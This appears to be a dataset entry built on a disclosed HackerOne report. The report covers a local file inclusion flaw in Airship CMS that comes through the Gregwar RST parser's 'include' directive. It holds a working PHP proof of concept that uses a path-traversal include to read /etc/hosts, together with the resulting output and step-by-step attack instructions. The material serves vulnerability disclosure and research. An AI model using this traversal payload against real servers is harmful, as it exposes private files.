@@ -1,0 +1,46 @@
+{
+  "reported_to": "Paragon Initiative Enterprises",
+  "reported_by": "h4ckninja ",
+  "title": "[Airship CMS] Local File Inclusion - RST Parser",
+  "content": "\nAirship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive include built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\nThe parser has this problem here:\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\nTo demonstrate:\nrst.php:\nCode 272 Bytes\n1<?php\n2\n3require('autoload.php');\n4\n5\n6$parser = new Gregwar\\RST\\Parser;\n7\n8// RST document\n9$document = '*Test*\n10\n11.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n12\n13``test``\n14';\n15\n16// Parse it\n17$html = $parser->parse($document);\n18\n19// Render it\n20echo $html;\nOutput:\nCode 262 Bytes\n1$ php rst.php\n2<p><em>Test</em></p>\n3<p>##\n4# Host Database\n5#\n6# localhost is used to configure the loopback interface\n7# when the system is booting.  Do not change this entry.\n8##\n9127.0.0.1\tlocalhost\n10255.255.255.255\tbroadcasthost\n11::1             localhost </p>\n12\n13[...]\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Information Disclosure"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1477933200,
+  "report_url": "https://hackerone.com/reports/179034",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Identify that Airship CMS uses the Gregwar RST Parser library."
+    ],
+    [
+      2,
+      "Create an RST document with a malicious 'include' directive pointing to a sensitive file (e.g., '/etc/hosts')."
+    ],
+    [
+      3,
+      "Parse the RST document using the Gregwar RST Parser to trigger the Local File Inclusion (LFI) vulnerability."
+    ],
+    [
+      4,
+      "Observe the contents of the sensitive file in the parsed output."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Local File Inclusion (LFI) in Airship CMS due to the use of the Gregwar RST Parser library, which includes a built-in 'include' directive that allows reading arbitrary files from the server. This can lead to unauthorized access to sensitive files on the system.",
+  "reason": "The vulnerability is straightforward to discover as it involves using a known feature (the 'include' directive) of a third-party library (Gregwar RST Parser) in an insecure manner. The attack does not require complex interactions or state manipulation, and the issue is well-documented in the RST specification.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
